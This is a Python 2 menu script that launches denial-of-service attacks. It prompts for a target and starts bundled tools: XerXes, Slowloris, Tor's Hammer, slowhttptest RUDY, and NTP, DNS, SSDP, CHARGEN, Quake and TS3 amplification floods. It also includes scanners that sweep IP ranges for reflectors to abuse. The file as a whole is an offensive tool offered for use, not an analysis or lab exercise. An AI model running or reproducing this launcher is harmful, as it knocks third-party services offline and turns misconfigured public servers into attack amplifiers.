#!/usr/bin/python

import os
import subprocess
import sys
from colors import *
try:
	while True:



		os.system("clear")
		file = open("Banner/banner", "r") 	#Stupid
		sys.stdout.write(GREEN)
		print file.read()			#Banner
		
		print ('1.DDoS Attacks\n')
		sys.stdout.write(BOLD)
		print('99.Quit\n')
		sys.stdout.write(BOLD)
		user_input_menu=input()

		############ DoS Attacks #################

		if user_input_menu==1:
			os.system("clear")
			while True:

				############################################
				file = open("Banner/ddos", "r") 
				sys.stdout.write(GREEN)	#----------> DDoS Banner
				print file.read()

				##################### Dos Options ##########
				print(" ")
				sys.stdout.write(BOLD)
				print ('1.TCP Connection Flood')
				sys.stdout.write(BOLD)
				print ('2.HTTP Attacks')
				sys.stdout.write(BOLD)
				print ('3.NTP AMP Attack')
				sys.stdout.write(BOLD)
				print ('4.DNS AMP Attack')
				sys.stdout.write(BOLD)
				print ('5.SSDP AMP Attack')
				sys.stdout.write(BOLD)
				print ('6.DOMINATE')
				sys.stdout.write(BOLD)
				print ('7.CHARGEN AMP Attacks')
				sys.stdout.write(BOLD)
				print ('8.SUDP AMP Attack')
				sys.stdout.write(BOLD)
				print ('9.QUAKE AMP Attacks')
				sys.stdout.write(BOLD)
				print ('10.TS3 AMP Attacks\n')
				sys.stdout.write(BOLD)
				print ('99.Go Back\n')
				sys.stdout.write(BOLD)
				user_input1=input()

				############################################


				if user_input1==1:
					os.system("clear")
					file = open("Banner/tcp", "r") 	#Stupid
					sys.stdout.write(GREEN)
					print file.read()
					sys.stdout.write(BOLD)
					print ('1.XerXes\n')
					sys.stdout.write(BOLD)
					print ('99.Go Back\n')
					sys.stdout.write(BOLD)
					user_input_TcpConnectionFlood=input()
					if user_input_TcpConnectionFlood==1:

						while True:
							os.system("clear")
							file = open("Banner/xerxes", "r")
							sys.stdout.write(GREEN) 	#----------> xerxes Banner
							print file.read()
							Domain=raw_input("     Domain: ") #--------> XerXes Dos Attack
							Port=raw_input("     Port: ")
							subprocess.call(['./Dos_Attacks/xerxes/xerxes',Domain, Port])
							break
					
					if user_input_TcpConnectionFlood==99:
						os.system("clear")
						break
				#################################################

				if user_input1==2: #----------> HTTP Attacks
					while True:

						os.system("clear")
						file = open("Banner/HTTP", "r") 
						sys.stdout.write(GREEN)	#Stupid
						print file.read()
						sys.stdout.write(BOLD)
						print ('1.Slowloris')
						sys.stdout.write(BOLD)
						print ('2.Tors Hammer')
						sys.stdout.write(BOLD)
						print ('3.SlowHTTPTest\n')
						
						sys.stdout.write(BOLD)
						print ('99.Go Back\n')
						sys.stdout.write(BOLD)
						user_input_HTTPAttacks=input()

						if user_input_HTTPAttacks==99:
							os.system("clear")
							break



						elif user_input_HTTPAttacks==1: #-------> slowloris						
							os.system("clear")
							print("\nSlowloris!!\n") #--------> Slowloris Dos Attack

							os.system("clear")
							file = open("Banner/slowloris", "r") 	#Stupid
							sys.stdout.write(GREEN)
							print file.read()
							print ('slowloris attack is about to start')
							Domain_s=raw_input("   Domain: ")
							subprocess.call(["perl","Dos_Attacks/slowloris/slowloris.pl","-dns",Domain_s])
							break

						#########################################
						elif user_input_HTTPAttacks==2: # ---------> tors hammer
							os.system("clear")
							file = open("Banner/hammer", "r") 
							sys.stdout.write(GREEN)	#Stupid
							print file.read()

							server_ip_hammer=raw_input("\n      Server IP: ")
							port_hammer=raw_input("      Port(80): ")
							turbo_hammer=raw_input("    Turbo(135): ")
							subprocess.call(["./Dos_Attacks/hammer/hammer.py","-s",server_ip_hammer,"-p",port_hammer,"-t",turbo_hammer])
						#########################################
						elif user_input_HTTPAttacks==3: #----------> rudy
							while True:
								os.system("clear")
								file = open("Banner/rudy", "r") 
								sys.stdout.write(GREEN)
								print file.read()
								print ('RUDY Attack using SLOWHTTPTEST Dos Tool !!!')
								connections_rudy=raw_input("     Connections(1000): ")
								followup_sec_rudy=raw_input("     FollowUp Seconds(110): ")
								connections_per_second_rudy=raw_input("     Connections Per Second(200): ")
								bytes_value_rudy=raw_input("     Bytes Value(8200): ")
								get_post_rudy=raw_input("     get/post: ")
								url_rudy=raw_input("     URL: ")
								subprocess.call(["slowhttptest","-c",connections_rudy,"-B","-i",followup_sec_rudy,"-r",connections_per_second_rudy,"-s",bytes_value_rudy,"-t",get_post_rudy,"-u",url_rudy])
								break



				elif user_input1==3: #-----> ntp amplification
					os.system("clear")
					file = open("Banner/ntp", "r")
					sys.stdout.write(YELLOW) 	#Stupid
					print file.read()
					sys.stdout.write(BOLD)
					print ('1.NTP Amplification Attack')
					sys.stdout.write(BOLD)
					print ('2.NTP AMP SCAN')
					sys.stdout.write(BOLD)
					print ('3.Callculate AMP Factor\n')
					sys.stdout.write(BOLD)
					print ('99.Go Back\n')
					sys.stdout.write(BOLD)
					user_input_NTP=input()
					while True:
						if user_input_NTP==99:
							os.system("clear")
							break

						if user_input_NTP==2: #------->ntp amp scan
							os.system("clear")
							file = open("Banner/NTP-SCAN", "r") 
							sys.stdout.write(YELLOW)	#----------> DDoS Banner
							print file.read()
							sys.stdout.write(BOLD)
							print ('Priv8 NTP SCANNER (AMP SCAN)')
							sys.stdout.write(BOLD)
							ip_range_start=raw_input("     IP Range Start: ")
							sys.stdout.write(BOLD)
							ip_range_end=raw_input("     IP Range End: ")
							sys.stdout.write(BOLD)
							outfile=raw_input("     Outfile: ")
							sys.stdout.write(BOLD)
							threads=raw_input("     Threads(4): ")
							sys.stdout.write(BOLD)
							scan_delay_ms=raw_input("     Scan_Delay_MS(999): ")
							sys.stdout.write(BOLD)
							subprocess.call(["./Dos_Attacks/NTP/ntpscan",ip_range_start,ip_range_end,outfile,threads,scan_delay_ms])
							break #---->NTP

						if user_input_NTP==1:
							os.system("clear")
							file = open("Banner/ntp-atck", "r") 
							sys.stdout.write(YELLOW)	#----------> DDoS Banner
							print file.read()
							sys.stdout.write(BOLD)
							domain_ntp=raw_input("     Target: ")
							sys.stdout.write(BOLD)
							ntp_amplification_file=raw_input("     NTP Amplification File: ")
							subprocess.call(["./Dos_Attacks/Saddam/Saddam.py",domain_ntp,"-n",ntp_amplification_file])


						if user_input_NTP==3:
							os.system("clear")
							file = open("Banner/amp-clct", "r")
							sys.stdout.write(YELLOW)
							print file.read()
							sys.stdout.write(BOLD)
							ntp_amp_file_clct=raw_input("     NTP AMP File: ")
							sys.stdout.write(BOLD)
							subprocess.call(["./Dos_Attacks/Saddam/Saddam.py","benchmark","-n",ntp_amp_file_clct])
							break


				#########################################
				elif user_input1==4: #------> dns amplification
					os.system("clear")
					file = open("Banner/dns", "r") 
					sys.stdout.write(GREEN)	#Stupid
					print file.read()
					sys.stdout.write(BOLD)
					print ('1.DNS Amplification Attack')
					sys.stdout.write(BOLD)
					print ('2.DNS AMP SCAN')
					sys.stdout.write(BOLD)
					print ('3.Callculate AMP Factor\n')
					sys.stdout.write(BOLD)
					print ('99.Go Back\n')
					sys.stdout.write(BOLD)
					user_input_DNS=input()
					while True:
						if user_input_DNS==99:
							os.system("clear")
							break

						if user_input_DNS==2:
							os.system("clear")
							file = open("Banner/DNS-SCAN", "r") 
							sys.stdout.write(GREEN)	#Stupid
							print file.read()	
							sys.stdout.write(BOLD)
							class_a_start=raw_input("     Class A Start: ")
							sys.stdout.write(BOLD)
							class_a_end=raw_input("     Class A End: ")
							sys.stdout.write(BOLD)
							outfile_dns=raw_input("     Outfile: ")
							sys.stdout.write(BOLD)
							threads_dns=raw_input("     Threads(222): ")
							sys.stdout.write(BOLD)
							scan_delay_ms_DNS=raw_input("     Scan_Delay_MS(999): ")
							sys.stdout.write(BOLD)
							subprocess.call(["./Dos_Attacks/DNS/dnsscan", class_a_start, class_a_end, outfile_dns, threads_dns,scan_delay_ms_DNS]) #---> DNS

						if user_input_DNS==3:
							os.system("clear")
							file = open("Banner/amp-clct", "r") 
							sys.stdout.write(GREEN)	#Stupid
							print file.read()
							sys.stdout.write(BOLD)
							print colored("\n                   USAGE:.  AmpFile:verisign.com\n","white")
							sys.stdout.write(BOLD)
							dns_amp_file_clct=raw_input("     DNS AMP File: ")
							sys.stdout.write(BOLD)
							subprocess.call(["./Dos_Attacks/Saddam/Saddam.py","benchmark","-d",dns_amp_file_clct])
							break

						if user_input_DNS==1:
							os.system("clear")
							file = open("Banner/dns-atck", "r")
							sys.stdout.write(GREEN)
							print file.read()
							sys.stdout.write(BOLD)
							print colored("\n               USAGE:.  AmpFile:verisign.com\n","white")
							sys.stdout.write(BOLD)
							target_dns=raw_input("     Target: ")
							sys.stdout.write(BOLD)
							dns_amp_file_atck=raw_input("     DNS AMP File: ")
							subprocess.call(["./Dos_Attacks/Saddam/Saddam.py",target_dns,"-d",dns_amp_file_atck])
				#########################################
				elif user_input1==5: #------> sddp amp
					while True:
						os.system("clear")
						sys.stdout.write(GREEN)
						file = open("Banner/sddp", "r") 	#Stupid
						print file.read()
						sys.stdout.write(BOLD)
						target_ssdp=raw_input("\n     Target: ")
						sys.stdout.write(BOLD)
						amp_file_ssdp=raw_input("     AMP File: ")
						sys.stdout.write(BOLD)
						subprocess.call(["./Dos_Attacks/Saddam/Saddam.py",target_ssdp,"-p",amp_file_ssdp])
					
				#########################################
				elif user_input1==6: #------> DOMINATE
					while True:
						os.system("clear")
						file = open("Banner/dominate", "r") 
						sys.stdout.write(GREEN)	#Stupid
						print file.read()
						sys.stdout.write(BOLD)
						target_dominate=raw_input("\n     TARGET(IP): ")
						sys.stdout.write(BOLD)
						port_dominate=raw_input("     PORT: ")
						sys.stdout.write(BOLD)
						threads_dominate=raw_input("     THREADS(100): ")
						sys.stdout.write(BOLD)
						pps_limit_dominate=raw_input("     PPS-LIMIT(-1 for no limit): ")
						sys.stdout.write(BOLD)
						time_dominate=raw_input("     TIME(SECONDS): ")
						sys.stdout.write(BOLD)
						subprocess.call(["./Dos_Attacks/dominate/dominate",target_dominate,port_dominate,threads_dominate,pps_limit_dominate,time_dominate])
				#########################################
				elif user_input1==7: #--------> CHARGEN AMP
					while True:
						os.system("clear")
						file = open("Banner/chargen", "r") 
						sys.stdout.write(GREEN)	#Stupid
						print file.read()
						sys.stdout.write(BOLD)
						print ('1.CHARGEN AMP ATTACK')
						sys.stdout.write(BOLD)
						print ('2.CHARGEN AMP SCAN\n')
						sys.stdout.write(BOLD)
						print ('99.Go Back')

						user_input_chargen=input(colored("     $: ","grey"))
						while True:

							if user_input_chargen==1:
								os.system("clear")
								file = open("Banner/chargen", "r") 
								sys.stdout.write(GREEN)	#Stupid
								print file.read()
								sys.stdout.write(BOLD)
								target_chargen=raw_input("     TARGET(IP): ")
								sys.stdout.write(BOLD)
								port_chargen=raw_input("     PORT: ")
								sys.stdout.write(BOLD)
								amp_file_chargen=raw_input("     AMP File: ")
								sys.stdout.write(BOLD)
								threads_chargen=raw_input("     THREADS: \n")
								sys.stdout.write(BOLD)
								subprocess.call("./Dos_Attacks/chargen/chargen",target_chargen,port_chargen,amp_file_chargen,threads_chargen)
								break

							elif user_input_chargen==2:
								os.system("clear")
								file = open("Banner/chargen-scan", "r")
								sys.stdout.write(GREEN) 	#Stupid
								print file.read()
								sys.stdout.write(BOLD)
								ip_range_start_chargen=raw_input("     IP RANGE START: ")
								sys.stdout.write(BOLD)
								ip_range_end_chargen=raw_input("     IP RANGE END: ")
								sys.stdout.write(BOLD)
								outfile_chargen_scan=raw_input("     OUTFILE: ")
								sys.stdout.write(BOLD)
								threads_chargen_scan=raw_input("     THREADS: ")
								sys.stdout.write(BOLD)
								scan_delay_in_ms_chargen=raw_input("     SCAN DELAY IN MS: ")
								sys.stdout.write(BOLD)
								subprocess.call(["./Dos_Attacks/chargen/chargenscan",ip_range_start_chargen,ip_range_end_chargen,outfile_chargen_scan,threads_chargen_scan,scan_delay_in_ms_chargen])
								break

							elif user_input_chargen==99:
								os.system("clear")
								break

							break
						break
				#########################################
				elif user_input1==8: #--------->sudp amp
					while True:
						os.system("clear")
						file = open("Banner/sudp", "r") 
						sys.stdout.write(GREEN)	#Stupid
						print file.read()
						target_sudp=raw_input("     TARGET(IP): ")
						sys.stdout.write(BOLD)
						port_sudp=raw_input("     PORT: ")
						sys.stdout.write(BOLD)
						amp_file_sudp=raw_input("     AMP File: ")
						sys.stdout.write(BOLD)
						time_sudp=raw_input("     TIME(SECONDS): ")
						sys.stdout.write(BOLD)
						message_sudp=raw_input("     MESSAGE: ")
						sys.stdout.write(BOLD)
						subprocess.call(["./Dos_Attacks/sudp/sudp",target_sudp,port_sudp,amp_file_sudp,time_sudp,message_sudp])

				#########################################
				elif user_input1==9:
					while True:
						os.system("clear")
						file = open("Banner/quake", "r")
						sys.stdout.write(GREEN) 	#Stupid
						print file.read()
						sys.stdout.write(BOLD)
						target_quake=raw_input("     TARGET: ")
						sys.stdout.write(BOLD)
						port_quake=raw_input("     PORT: ")
						sys.stdout.write(BOLD)
						amp_file_quake=raw_input("     AMP FILE: ")
						sys.stdout.write(BOLD)
						threads_quake=raw_input("     THREADS: ")
						sys.stdout.write(BOLD)
						pps_limit_quake=raw_input("     PPS limiter(-1 for no limits): ")
						sys.stdout.write(BOLD)
						time_quake=raw_input("     TIME: ")
						sys.stdout.write(BOLD)
						subprocess.call("./Dos_Attacks/quake/quake3",target_quake,port_quake,amp_file_quake,threads_quake,pps_limit_quake,time_quake)
						break
				########################################
				elif user_input1==10:
					while True:
						os.system("clear")
						file = open("Banner/TS3", "r") 
						sys.stdout.write(GREEN)	#Stupid
						print file.read()
						sys.stdout.write(BOLD)
						print ('1.TS3 AMP Attack')
						sys.stdout.write(BOLD)
						print ('2.TS3 AMP Scan\n')
						sys.stdout.write(BOLD)
						print ('99.Go Back\n')
						sys.stdout.write(BOLD)
						user_input_ts3=input()
						if user_input_ts3==1:
							os.system("clear")
							file = open("Banner/TS3-atck", "r")
							sys.stdout.write(GREEN) 	#Stupid
							print file.read()
							sys.stdout.write(BOLD)
							target_ts3=raw_input("     TARGET: ")
							sys.stdout.write(BOLD)
							port_ts3=raw_input("     PORT: ")
							sys.stdout.write(BOLD)
							amp_file_ts3_atck=raw_input("     AMP Flie: ")
							sys.stdout.write(BOLD)
							threads_ts3=raw_input("     THREADS: ")
							sys.stdout.write(BOLD)
							time_ts3=raw_input("     TIME: ")
							sys.stdout.write(BOLD)
							subprocess.call(["./Dos_Attacks/ts3/ts3",target_ts3,port_ts3,amp_file_ts3_atck,threads_ts3,time_ts3])

						elif user_input_ts3==2:
							os.system("clear")
							file = open("Banner/TS3-scan", "r")
							sys.stdout.write(GREEN) 	#Stupid
							print file.read()
							sys.stdout.write(BOLD)
							ip_range_start_ts3=raw_input("     IP RANGE START: ")
							sys.stdout.write(BOLD)
							ip_range_end_ts3=raw_input("     IP RANGE END: ")
							sys.stdout.write(BOLD)
							outfile_ts3_scan=raw_input("     OUTFILE: ")
							sys.stdout.write(BOLD)
							threads_ts3_scan=raw_input("     THREADS: ")
							sys.stdout.write(BOLD)
							scan_delay_in_ms_ts3=raw_input("     SCAN DELAY IN MS: ")
							sys.stdout.write(BOLD)
							subprocess.call(["./Dos_Attacks/ts3/ts3scan",ip_range_start_ts3,ip_range_end_ts3,outfile_ts3_scan,threads_ts3_scan,scan_delay_in_ms_ts3])
							

						elif user_input_ts3==99:
							os.system("clear")
							break
				#########################################
				#########################################

				elif user_input1==99: #-----> quit DoS attack
					os.system("clear")
					break

		########################################## ------> port scanner



		#########################################

		########## Quit Option ###################

		elif user_input_menu==99: 
			sys.stdout.write(BOLD)
			print ('THANKS 4 USING THIS TOOL!!')
			break

except KeyboardInterrupt:
	sys.exit(0) # or 1, or whatever
